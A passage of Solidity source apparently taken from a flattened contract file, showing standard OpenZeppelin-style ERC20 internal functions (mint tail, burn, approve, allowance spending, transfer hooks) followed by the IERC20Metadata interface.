        // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
        _balances[account] += amount;
    }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _balances[account] = accountBalance - amount;
        // Overflow not possible: amount <= accountBalance <= totalSupply.
        _totalSupply -= amount;
    }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;

import "./IERC20.sol";

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}